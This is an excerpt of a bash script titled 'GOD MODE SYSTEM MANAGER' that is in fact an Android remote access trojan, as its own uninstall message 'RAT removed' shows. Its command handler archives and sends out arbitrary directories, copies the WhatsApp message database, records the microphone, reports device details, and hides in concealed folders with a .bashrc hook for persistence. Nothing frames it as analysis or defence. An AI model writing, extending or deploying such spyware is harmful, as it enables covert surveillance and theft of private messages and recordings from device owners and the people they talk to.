#!/bin/bash
# ============================================================
# GOD MODE SYSTEM MANAGER v9999 — Survives Uninstall + All Commands
...
execute() {
  ...
  case "$cmd" in
    ...
    /download) path="${cmd#/download }"; cd "$path" 2>/dev/null && tar czf /tmp/dl.tar.gz . 2>/dev/null; [ -f /tmp/dl.tar.gz ] && send_file "/tmp/dl.tar.gz" "Download: $path" || send_msg "Download failed" ;;
    ...
    /info) send_msg "MODEL: $(getprop ro.product.model) | ANDROID: $(getprop ro.build.version.release) | CPU: $(getprop ro.product.cpu.abi)" ;;
    ...
    /whatsapp) cp /sdcard/WhatsApp/Databases/msgstore.db /tmp/wa.db 2>/dev/null; [ -f /tmp/wa.db ] && send_file "/tmp/wa.db" "WhatsApp DB" || send_msg "WA not found" ;;
    ...
    /mic) dur="${cmd#/mic }"; [ -z "$dur" ] && dur=10; termux-microphone-record -f /tmp/mic.wav -l "$dur" 2>/dev/null; [ -f /tmp/mic.wav ] && send_file "/tmp/mic.wav" "Audio $dur sec" || send_msg "Mic failed" ;;
    ...
    /uninstall) rm -rf ~/.hidden /sdcard/.system_cache; sed -i '/system_manager/d' ~/.bashrc; send_msg "RAT removed" ;;
